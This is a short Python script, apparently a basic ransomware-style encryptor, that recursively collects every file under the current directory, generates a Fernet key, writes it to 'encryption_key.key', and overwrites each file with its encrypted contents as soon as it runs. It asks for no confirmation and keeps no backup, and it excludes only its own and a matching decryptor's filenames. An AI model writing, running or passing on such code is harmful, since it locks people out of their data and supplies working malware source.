from os import listdir
from os.path import isfile, join
from cryptography.fernet import Fernet

files = []
def get_files_names(dir: str):
	excluded_files = ["encryption.py", "encryption", "encryption.exe", "decryption.py", "decryption", "decryption.exe", "encryption_key.key"]
	try:
		list_of_dir = listdir(dir)
	except:
		list_of_dir = []
	for file in list_of_dir:
		if isfile(join(dir, file)) and file.split("/")[-1] not in excluded_files:
			files.append(join(dir, file))
		else:
			get_files_names(join(dir, file))

def encrypt_files():
	key = Fernet.generate_key()
	with open("encryption_key.key", "wb") as key_file:
		key_file.write(key)
	fernet = Fernet(key)
	for file in files:
		with open(file, "rb") as f:
			content = f.read()
			encrypted_data = fernet.encrypt(content)
		with open(file, "wb") as f:
			f.write(encrypted_data)

get_files_names("./")
encrypt_files()